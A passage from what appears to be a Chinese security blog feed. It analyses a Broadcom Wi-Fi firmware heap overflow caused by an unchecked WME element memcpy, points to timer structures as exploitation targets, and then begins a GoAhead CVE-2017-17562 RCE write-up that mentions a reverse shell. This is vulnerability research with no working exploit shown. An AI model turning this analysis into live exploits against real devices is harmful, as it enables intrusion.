<h2 id="wifi驱动发送管理帧数据包流程"><a href="#wifi驱动发送管理帧数据包流程" class="headerlink" title="wifi驱动发送管理帧数据包流程"></a>wifi驱动发送管理帧数据包流程</h2><p>总共定位到一处位置：</p>
<p>是在kernel中发送数据包的过程<br>在\VMG1312-B-master\VMG1312-B-master\kernel\linux\drivers\staging\otus\80211core\cmm.c 中的函数 void zfSendMmFrame(zdev_t<em> dev, u8_t frameType, u16_t</em> dst,<br>                   u32_t p1, u32_t p2, u32_t p3)中实现<br>wlan连接过程：<br>    STA (工作站）启动初始化、开始正式使用、AP 传送数据幀之前，要经过三个阶段才能接入:<br>    (1) 扫描(SCAN)<br>    (2) 认证(Authentication)<br>    (3) 关联(Association) </p>
<p>1）探测帧</p>
<figure class="highlight glsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_PROBEREQ :<span class="comment">//构造探测帧</span></div><div class="line">            <span class="keyword">offset</span> = zfSendProbeReq(dev, buf, <span class="keyword">offset</span>, (u8_t) p1);<span class="comment">//探测请求</span></div><div class="line">            <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<p>2）探测响应帧</p>
<p>构造探测响应帧时有WME参数部分<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">case ZM_WLAN_FRAME_TYPE_PROBERSP : <span class="comment">//探测响应帧</span></div><div class="line">            zm_msg0_mm(ZM_LV_3, <span class="string">"probe rsp"</span>);</div><div class="line">            <span class="comment">/* 24-31 Time Stamp : hardware WON'T fill this field */</span></div><div class="line">            zmw_tx_buf_writeh(dev, buf, <span class="built_in">offset</span>, <span class="number">0</span>);</div><div class="line">            zmw_tx_buf_writeh(dev, buf, <span class="built_in">offset</span>+<span class="number">2</span>, <span class="number">0</span>);</div><div class="line">            zmw_tx_buf_writeh(dev, buf, <span class="built_in">offset</span>+<span class="number">4</span>, <span class="number">0</span>);</div><div class="line">            zmw_tx_buf_writeh(dev, buf, <span class="built_in">offset</span>+<span class="number">6</span>, <span class="number">0</span>);</div><div class="line">            <span class="built_in">offset</span>+=<span class="number">8</span>;</div><div class="line">...</div><div class="line">...</div><div class="line">..</div><div class="line"> <span class="comment">/* WME Parameters */</span></div><div class="line">            <span class="keyword">if</span> (wd-&gt;wlanMode == ZM_MODE_AP)</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">if</span> (wd-&gt;ap.qosMode == <span class="number">1</span>)</div><div class="line">                &#123;</div><div class="line">                    <span class="built_in">offset</span> = zfApAddIeWmePara(dev, buf, <span class="built_in">offset</span>, vap);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> ( wd-&gt;wlanMode != ZM_MODE_IBSS )</div><div class="line">            &#123;</div><div class="line">            <span class="comment">// jhlee HT 0</span></div><div class="line">            <span class="comment">//CWYang(+)</span></div><div class="line">                <span class="comment">/* TODO : Need to check if it is ok */</span></div><div class="line">            <span class="comment">/* HT Capabilities Info */</span></div><div class="line">            <span class="built_in">offset</span> = zfMmAddHTCapability(dev, buf, <span class="built_in">offset</span>);</div><div class="line">            <span class="comment">//CWYang(+)</span></div><div class="line">            <span class="comment">/* Extended HT Capabilities Info */</span></div><div class="line">            <span class="built_in">offset</span> = zfMmAddExtendedHTCapability(dev, buf, <span class="built_in">offset</span>);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> ( wd-&gt;sta.ibssAdditionalIESize )</div><div class="line">                <span class="built_in">offset</span> = zfStaAddIbssAdditionalIE(dev, buf, <span class="built_in">offset</span>);</div><div class="line">            break;</div></pre></td></tr></table></figure></p>
<p>3）身份认证</p>
<figure class="highlight glsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_AUTH :<span class="comment">//身份认证</span></div><div class="line">            <span class="keyword">if</span> (p1 == <span class="number">0x30001</span>)</div><div class="line">            &#123;</div><div class="line">                hlen += <span class="number">4</span>;</div><div class="line">                <span class="keyword">offset</span> += <span class="number">4</span>;        <span class="comment">// for reserving wep header</span></div><div class="line">                encrypt = <span class="number">1</span>;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="comment">/* Algotrithm Number */</span></div><div class="line">            zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, (u16_t)(p1&amp;<span class="number">0xffff</span>));</div><div class="line">            <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line"></div><div class="line">            <span class="comment">/* Transaction Number */</span></div><div class="line">            zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, (u16_t)(p1&gt;&gt;<span class="number">16</span>));</div><div class="line">            <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line">...</div><div class="line">..</div><div class="line">..</div><div class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (p1 == <span class="number">0x30001</span>)</div><div class="line">            &#123;</div><div class="line">                <span class="comment">/* share-3 : STA return challenge Text */</span></div><div class="line">                zfCopyToIntTxBuffer(dev, buf, wd-&gt;sta.challengeText, <span class="keyword">offset</span>, wd-&gt;sta.challengeText[<span class="number">1</span>]+<span class="number">2</span>);</div><div class="line">                <span class="keyword">offset</span> += (wd-&gt;sta.challengeText[<span class="number">1</span>]+<span class="number">2</span>);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<p>4）关联请求/重新关联请求<br><figure class="highlight glsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_ASOCREQ :<span class="comment">//关联请求帧</span></div><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_REASOCREQ :  <span class="comment">// FC_REASSOC_REQ = 0x20 重新关联请求帧</span></div><div class="line">    <span class="comment">/* Capability */</span></div><div class="line">    zmw_tx_buf_writeb(dev, buf, <span class="keyword">offset</span>++, wd-&gt;sta.capability[<span class="number">0</span>]);</div><div class="line">    zmw_tx_buf_writeb(dev, buf, <span class="keyword">offset</span>++, wd-&gt;sta.capability[<span class="number">1</span>]);</div><div class="line"></div><div class="line">    <span class="comment">/* Listen Interval */</span>  <span class="comment">//监听间隔</span></div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, <span class="number">0x0005</span>);</div><div class="line">    <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line"></div><div class="line">    <span class="comment">/* Reassocaited Request : Current AP address */</span></div><div class="line">    <span class="keyword">if</span> (frameType == ZM_WLAN_FRAME_TYPE_REASOCREQ)<span class="comment">// FC_REASSOC_REQ = 0x20 重新关联请求帧</span></div><div class="line">    &#123;</div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, wd-&gt;sta.bssid[<span class="number">0</span>]);</div><div class="line">        <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, wd-&gt;sta.bssid[<span class="number">1</span>]);</div><div class="line">        <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, wd-&gt;sta.bssid[<span class="number">2</span>]);</div><div class="line">        <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">    ...</div><div class="line">    </div><div class="line">    <span class="comment">//Store asoc request frame body, for VISTA only</span></div><div class="line">    wd-&gt;sta.asocReqFrameBodySize = ((<span class="keyword">offset</span> - hlen) &gt;</div><div class="line">            ZM_CACHED_FRAMEBODY_SIZE)?</div><div class="line">            ZM_CACHED_FRAMEBODY_SIZE:(<span class="keyword">offset</span> - hlen);</div><div class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;wd-&gt;sta.asocReqFrameBodySize; i++)</div><div class="line">    &#123;</div><div class="line">        wd-&gt;sta.asocReqFrameBody[i] = zmw_tx_buf_readb(dev, buf, i + hlen);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
<p>5）关联响应/重新关联响应</p>
<p>这部分也有WME的相关参数构造<br><figure class="highlight glsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_ASOCRSP :<span class="comment">//关联响应帧</span></div><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_REASOCRSP :<span class="comment">// 重新关联响应帧</span></div><div class="line">    vap = (u16_t) p3;</div><div class="line"></div><div class="line">    <span class="comment">/* Capability */</span></div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, wd-&gt;ap.capab[vap]);</div><div class="line">    <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line"></div><div class="line">    <span class="comment">/* Status Code */</span></div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, (u16_t)p1);</div><div class="line">    <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line"></div><div class="line">    <span class="comment">/* AID */</span></div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, (u16_t)(p2|<span class="number">0xc000</span>));</div><div class="line">    <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line">    ...</div><div class="line">    ...</div><div class="line">    ...</div><div class="line"><span class="comment">/* WME Parameters */</span></div><div class="line">    <span class="keyword">if</span> (wd-&gt;wlanMode == ZM_MODE_AP)</div><div class="line">    &#123;</div><div class="line">        <span class="comment">/* TODO : if WME STA then send WME parameter element */</span></div><div class="line">        <span class="keyword">if</span> (wd-&gt;ap.qosMode == <span class="number">1</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">offset</span> = zfApAddIeWmePara(dev, buf, <span class="keyword">offset</span>, vap);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// jhlee HT 0</span></div><div class="line">    <span class="comment">//CWYang(+)</span></div><div class="line">    <span class="comment">/* HT Capabilities Info */</span></div><div class="line">    <span class="keyword">offset</span> = zfMmAddHTCapability(dev, buf, <span class="keyword">offset</span>);</div><div class="line">    <span class="comment">//CWYang(+)</span></div><div class="line">    <span class="comment">/* Extended HT Capabilities Info */</span></div><div class="line">    <span class="keyword">offset</span> = zfMmAddExtendedHTCapability(dev, buf, <span class="keyword">offset</span>);</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
<p>6）通知传输指示信息<br><figure class="highlight glsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_ATIM :<span class="comment">//通知传输指示消息</span></div><div class="line">            <span class="comment">/* NULL frame */</span></div><div class="line">            <span class="comment">/* TODO : add two dumb bytes temporarily */</span></div><div class="line">            <span class="keyword">offset</span> += <span class="number">2</span>;</div><div class="line">            <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
<p>7）QoS帧/数据帧</p>
<figure class="highlight glsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"> <span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_QOS_NULL :</div><div class="line">            zmw_buf_writeh(dev, buf, <span class="keyword">offset</span>, <span class="number">0x0010</span>);</div><div class="line">            <span class="keyword">offset</span> += <span class="number">2</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">case</span> ZM_WLAN_DATA_FRAME :</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<p>8）解除关联/解除认证</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_DISASOC :<span class="comment">//解除关联</span></div><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_DEAUTH :<span class="comment">//解除认证</span></div><div class="line">    <span class="keyword">if</span> (wd-&gt;wlanMode == ZM_MODE_AP)</div><div class="line">    &#123;</div><div class="line">      vap = (u16_t) p3;</div><div class="line"></div><div class="line">      <span class="keyword">if</span> ((aid = zfApFindSta(dev, dst)) != <span class="number">0xffff</span>)</div><div class="line">      &#123;</div><div class="line">          zmw_enter_critical_section(dev);</div><div class="line">          <span class="comment">/* Clear STA table */</span></div><div class="line">          wd-&gt;ap.staTable[aid].valid = <span class="number">0</span>;</div><div class="line"></div><div class="line">          zmw_leave_critical_section(dev);</div><div class="line"></div><div class="line">          <span class="keyword">if</span> (wd-&gt;zfcbDisAsocNotify != <span class="keyword">NULL</span>)</div><div class="line">          &#123;</div><div class="line">              wd-&gt;zfcbDisAsocNotify(dev, (u8_t*)dst, vap);</div><div class="line">          &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">/* Reason Code */</span></div><div class="line">    zmw_tx_buf_writeh(dev, buf, offset, (u16_t)p1);</div><div class="line">    offset+=<span class="number">2</span>;</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<p>在wifi连接过程中主要有这些数据包种类</p>
<p>9）发送数据包<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">zfwBufSetSize</span>(dev, buf, offset);<span class="comment">//拷贝构造好的数据包到dev</span></div><div class="line"></div><div class="line"><span class="selector-tag">zm_msg2_mm</span>(ZM_LV_2, <span class="string">"management frame body size="</span>, offset-hlen);</div><div class="line"></div><div class="line"><span class="comment">//Copy wlan header</span></div><div class="line"><span class="selector-tag">zfTxGenMmHeader</span>(dev, frameType, dst, header, offset-hlen, buf, vap, encrypt);<span class="comment">//发送数据包过程</span></div></pre></td></tr></table></figure></p>
<h2 id="Wifi固件接收到管理帧的处理过程"><a href="#Wifi固件接收到管理帧的处理过程" class="headerlink" title="Wifi固件接收到管理帧的处理过程"></a>Wifi固件接收到管理帧的处理过程</h2><p>我们关注的还是漏洞触发位置的重新关联响应帧</p>
<p>1）解析重新关联响应帧时造成溢出的过程</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">void wlc_bss_parse_wme_ie(wlc_info *wlc, ie_parser_arg *arg) &#123;</div><div class="line">  unsigned int frame_type;  </div><div class="line">  wlc_bsscfg *cfg;  </div><div class="line">  bcm_tlv *ie;  </div><div class="line">  unsigned char *current_wmm_ie;  </div><div class="line">  int flags;</div><div class="line">  <span class="function"><span class="title">frame_type</span> = arg-&gt;</span>frame_type;  </div><div class="line">  <span class="function"><span class="title">cfg</span> = arg-&gt;</span>bsscfg;  </div><div class="line">  <span class="function"><span class="title">ie</span> = arg-&gt;</span>ie;  </div><div class="line">  <span class="function"><span class="title">current_wmm_ie</span> = cfg-&gt;</span>current_wmm_ie;  </div><div class="line">  <span class="keyword">if</span> ( frame_type == FC_REASSOC_REQ ) &#123;    </div><div class="line">    ...    </div><div class="line">    &lt;handle reassociation requests&gt;    </div><div class="line">    ...  &#125;  </div><div class="line">  <span class="keyword">if</span> ( frame_type == FC_ASSOC_RESP ) &#123;    </div><div class="line">    ...    </div><div class="line">    <span class="function"><span class="title">if</span> ( wlc-&gt;</span><span class="function"><span class="title">pub</span>-&gt;</span>_wme ) &#123;      </div><div class="line">      <span class="keyword">if</span> ( !(flags &amp; <span class="number">2</span>) ) &#123;        </div><div class="line">        ...        </div><div class="line">        <span class="keyword">if</span> ( ie ) &#123;          </div><div class="line">          ...          </div><div class="line">          <span class="function"><span class="title">cfg</span>-&gt;</span>flags |= <span class="number">0</span>x100u;          </div><div class="line">          <span class="function"><span class="title">memcpy</span>(current_wmm_ie, ie-&gt;</span><span class="function"><span class="title">data</span>, ie-&gt;</span>len);</div></pre></td></tr></table></figure>
<p>2)溢出的位置确定</p>
<p>溢出的位置是current_wmm_ie的下一个结构体wlc-&gt;pm</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">wlc_bsscfg *wlc_bsscfg_malloc(wlc_info *wlc) &#123;  </div><div class="line">  wlc_info *wlc<span class="comment">;  </span></div><div class="line">  wlc_bss_info *current_bss<span class="comment">;  </span></div><div class="line">  wlc_bss_info *target_bss<span class="comment">;  </span></div><div class="line">  wlc_pm_st *pm<span class="comment">;  </span></div><div class="line">  wmm_ie *current_wmm_ie<span class="comment">;</span></div><div class="line">  ...  </div><div class="line">  current_bss = wlc_calloc(<span class="number">0x124</span>)<span class="comment">;  </span></div><div class="line">  wlc-&gt;current_bss = current_bss<span class="comment">;  </span></div><div class="line">  if ( !current_bss ) &#123;    </div><div class="line">    goto fail<span class="comment">;  &#125;  </span></div><div class="line">  target_bss = wlc_calloc(<span class="number">0x124</span>)<span class="comment">;  </span></div><div class="line">  wlc-&gt;target_bss = target_bss<span class="comment">;  </span></div><div class="line">  if ( !target_bss ) &#123;    </div><div class="line">    goto fail<span class="comment">;  &#125;  </span></div><div class="line">  pm = wlc_calloc(<span class="number">0x78</span>)<span class="comment">;  </span></div><div class="line">  wlc-&gt;pm = pm<span class="comment">;  </span></div><div class="line">  if ( !pm ) &#123;    </div><div class="line">    goto fail<span class="comment">;  &#125;  </span></div><div class="line">  current_wmm_ie = wlc_calloc(<span class="number">0x2C</span>)<span class="comment">;  </span></div><div class="line">  wlc-&gt;current_wmm_ie = current_wmm_ie<span class="comment">;  </span></div><div class="line">  if ( !current_wmm_ie ) &#123;    </div><div class="line">    goto fail<span class="comment">;  &#125;</span></div></pre></td></tr></table></figure>
<p>3）溢出结构体类型</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">typedef struct wlc_pm_st &#123; </div><div class="line">  uint8 PM<span class="comment">; bool PM_override; </span></div><div class="line">  mbool PMenabledModuleId<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>PMenabled<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>PMawakebcn<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>PMpending<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>priorPMstate<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>PSpoll<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>check_for_unaligned_tbtt<span class="comment">; </span></div><div class="line">  uint16 pspoll_prd<span class="comment">; </span></div><div class="line">  struct wl_timer *pspoll_timer<span class="comment">; </span></div><div class="line">  uint16 apsd_trigger_timeout<span class="comment">; </span></div><div class="line">  struct wl_timer *apsd_trigger_timer<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>apsd_sta_usp<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>WME_PM_blocked<span class="comment">; </span></div><div class="line">  uint16 pm2_rcv_percent<span class="comment">; </span></div><div class="line">  pm2rd_state_t pm2_rcv_state<span class="comment">; </span></div><div class="line">  uint16 pm2_rcv_time<span class="comment">; </span></div><div class="line">  uint pm2_sleep_ret_time<span class="comment">; </span></div><div class="line">  uint pm2_sleep_ret_time_left<span class="comment">;  </span></div><div class="line">  uint pm2_last_wake_time<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>pm2_refresh_badiv<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>adv_ps_poll<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>send_pspoll_after_tx<span class="comment">;    </span></div><div class="line">  wlc_hwtimer_to_t *pm2_rcv_timer<span class="comment">;  </span></div><div class="line">  wlc_hwtimer_to_t *pm2_ret_timer<span class="comment">; </span></div><div class="line">&#125; wlc_pm_st_t<span class="comment">;</span></div></pre></td></tr></table></figure>
<p>4）漏洞利用方式</p>
<p>struct wlc_pm_st结构体中 wl_timer 类型的pspoll_timer、  apsd_trigger_timer，和wlc_hwtimer_to_t 类型的pm2_rcv_timer、  pm2_ret_timer。<br>wl_timer的 pspoll_timer 成员。这个结构体能在相关过程中定期触发的回调函数进行处理：<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">int timer_func(struct wl_timer *t) &#123;  </div><div class="line">  prev_cpsr = j_disable_irqs();  </div><div class="line">  <span class="function"><span class="title">v3</span> = t-&gt;</span>field_20;    </div><div class="line">  ...</div><div class="line">  <span class="keyword">if</span> ( v3 ) &#123;    </div><div class="line">    <span class="function"><span class="title">v7</span> = t-&gt;</span>field_18;    </div><div class="line">    <span class="function"><span class="title">v8</span> = &amp;t-&gt;</span>field_8;    </div><div class="line">    <span class="function"><span class="title">if</span> ( &amp;t-&gt;</span>field_8 == v7 ) &#123;</div><div class="line">      ... </div><div class="line">    &#125; <span class="keyword">else</span> &#123;      </div><div class="line">      <span class="function"><span class="title">v9</span> = t-&gt;</span>field_1c;      </div><div class="line">      <span class="function"><span class="title">v7</span>-&gt;</span>field_14 = v9;      </div><div class="line">      *(v9 + <span class="number">16</span>) = v7;      </div><div class="line">      <span class="keyword">if</span> ( *v3 == v8 ) &#123;        </div><div class="line">        <span class="function"><span class="title">v7</span>-&gt;</span>field_18 = v3; </div><div class="line">      &#125;    </div><div class="line">    &#125;    </div><div class="line">    <span class="function"><span class="title">t</span>-&gt;</span>field_20 = <span class="number">0</span>;  </div><div class="line">  &#125;  </div><div class="line">  j_restore_cpsr(prev_cpsr);  </div><div class="line">  return <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这部分代码是在linux内核里，初步分析是wifi驱动管理帧数据包发送过程，结合研究固件的源码中解析数据包的过程一起看，差不多整个wifi连接过程数据包的处理流程就出来了。接下来的工作，一个是固件地址爆破，还有一个是写exp利用漏洞。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> 802.11协议帧格式 ：<a href="http://blog.csdn.net/u012570105/article/details/51785452" rel="external nofollow noopener noreferrer" target="_blank">http://blog.csdn.net/u012570105/article/details/51785452</a></p>
<p> <a href="http://note.youdao.com/noteshare?id=1966431935077db30135e04ba4bb80a6&amp;sub=C682C939E8AD4869B8C877E0CA546A24" rel="external nofollow noopener noreferrer" target="_blank">相关代码参考</a> ：</p>
<blockquote>
<p>cmm.c :主要是wifi驱动发送管理帧数据包流程</p>
<p>wl_linux.h : wl_timer结构体参考</p>
<p>wlan.h:</p>
</blockquote>
<pre><code>/* Frame Subtype */
#define ZM_WLAN_FRAME_TYPE_ASOCREQ          0x00
#define ZM_WLAN_FRAME_TYPE_ASOCRSP          0x10
#define ZM_WLAN_FRAME_TYPE_REASOCREQ        0x20
#define ZM_WLAN_FRAME_TYPE_REASOCRSP        0x30
#define ZM_WLAN_FRAME_TYPE_PROBEREQ         0x40
#define ZM_WLAN_FRAME_TYPE_PROBERSP         0x50
</code></pre><blockquote>
<p>wlc_alloc.c :wlc_bsscfg_malloc结构体</p>
<p>wlc_bsscfg.h : wlc_pm_st 结构体参考</p>
<p>wlc.c:部分解析管理帧可以根据关键字FC_ASSOC_RESP来定位看</p>
</blockquote>
<p>​        </p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;切入点&quot;&gt;&lt;a href=&quot;#切入点&quot; class=&quot;headerlink&quot; title=&quot;切入点&quot;&gt;&lt;/a&gt;切入点&lt;/h2&gt;&lt;p&gt;从解析wme信标帧开始&lt;br&gt;参考：&lt;a href=&quot;http://www.freebuf.com/vuls/142099.html
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Poc" scheme="http://www.future-sec.com/tags/Poc/"/>
    
      <category term="BROADCOM WI-FI" scheme="http://www.future-sec.com/tags/BROADCOM-WI-FI/"/>
    
  </entry>
  
  <entry>
    <title>GoAhead远程代码执行漏洞(CVE-2017-17562)分析及实战</title>
    <link href="http://www.future-sec.com/GoAhead-CVE-2017-17562-analysis-and-pwn-a-router.html"/>
    <id>http://www.future-sec.com/GoAhead-CVE-2017-17562-analysis-and-pwn-a-router.html</id>
    <published>2017-12-25T16:00:00.000Z</published>
    <updated>2018-06-29T08:59:11.358Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>GoAhead Web Server 广泛应用于嵌入式设备中，最近其出现了一个高危漏洞，在开启CGI的情况下，可以远程代码执行，据此本文简要分析了该漏洞详情，并在某款路由器上成功复现，反弹shell。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>   这个漏洞出现在goahead/src/cgi.c:cgihandler函数中，它使用http请求参数中的键值对来初始化新进程的envp参数，在此处只对“REMOTE_HOST”和“HTTP_AUTHORIZATION”参数进行了判断，其他参数全部默认信任。</p>
